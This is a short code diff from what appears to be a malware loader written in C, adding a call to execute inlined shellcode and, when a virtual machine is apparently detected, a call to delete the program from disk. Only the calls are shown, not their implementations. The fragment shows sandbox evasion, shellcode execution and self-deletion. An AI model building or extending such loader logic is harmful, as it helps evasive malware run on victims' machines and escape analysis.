@@ -19,11 +19,13 @@ int main(){
 		
 		// TODO: ShellcodeDetonation
 		PRINT("[i] Executing shellcode!\n");
+		InlinedShellcodeExecution();
 		
 	}else{
 		
 		// TODO: SelfDelete
-		PRINT("[i] Self-deleting!\n");
+		PRINT("[i] VM Detected. Self-deleting!\n");
+		DeleteSelfFromDisk();
 		
 	}
 	
